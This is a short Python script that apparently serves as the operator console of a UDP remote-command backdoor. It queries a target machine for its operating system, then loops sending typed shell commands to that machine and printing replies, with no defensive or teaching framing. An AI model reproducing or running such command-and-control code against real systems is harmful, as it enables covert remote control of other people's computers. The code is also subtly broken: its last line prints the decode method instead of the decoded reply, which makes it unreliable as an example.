import socket,time,os,sys,subprocess
#UDP Socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
target_address=("127.0.0.1",9999)   #0.0.0.0==for automatically get ip address
user=input("Enter your handler:")
os.system('clear')    #clear my screen
print("\t\t\t\t welcome",user)
print("checking target OS")
wait_os="tell me your os name"
s.sendto(wait_os.encode('ascii'),target_address)
# to receive os details
oscheck=s.recvfrom(10)
print(oscheck)
if oscheck[0].decode('ascii')=='darwin':
    print("Target Machine is MAC os")
    time.sleep(1)
    print("Now only send controll or command related to MAC")
elif oscheck[0].decode('ascii')=='linux':
    print("Target Machine is Linux based os")
    time.sleep(1)
    print("Now only send controll or command related to Linux")
elif oscheck[0].decode('ascii')=='win32':
    print("Target Machine is Windows based os")
    time.sleep(1)
    print("Now only send controll or command related to Windows")

while True:
    cmd=input("Enter your command:")
    if cmd== 'exit' or cmd== 'logout':
        print("Disconnecting to remote host..")
        exit()  #closing python
    else:
        s.sendto(cmd.encode('ascii'),target_address)
        print("Instruction sent..")
        time.sleep(1)
        print("waiting for response..")
        output=s.recvfrom(100)
        print(output[0].decode)


    
